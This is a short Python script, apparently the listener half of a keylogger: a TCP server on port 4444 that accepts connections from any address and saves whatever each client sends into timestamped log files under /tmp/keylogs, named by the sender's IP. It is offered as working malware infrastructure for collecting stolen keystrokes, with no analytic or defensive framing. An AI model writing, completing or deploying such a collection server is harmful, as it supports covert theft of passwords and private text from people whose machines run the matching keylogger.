import socket
import os
from datetime import datetime

HOST = '0.0.0.0'  # Accept from any IP, including localhost (127.0.0.1)
PORT = 4444
LOG_DIR = '/tmp/keylogs'

os.makedirs(LOG_DIR, exist_ok=True)

def save_log(data, client_address):
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"{client_address[0]}_{timestamp}.log"
    path = os.path.join(LOG_DIR, filename)
    with open(path, 'wb') as f:
        f.write(data)
    print(f"[+] Saved log to {path}")

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((HOST, PORT))
        server_socket.listen(5)
        print(f"[+] Listening on {HOST}:{PORT}")

        while True:
            client_socket, client_address = server_socket.accept()
            print(f"[+] Connection from {client_address}")
            data = b''
            while True:
                chunk = client_socket.recv(4096)
                if not chunk:
                    break
                data += chunk
            save_log(data, client_address)
            client_socket.close()
            print(f"[+] Connection with {client_address} closed")

if __name__ == '__main__':
    main()
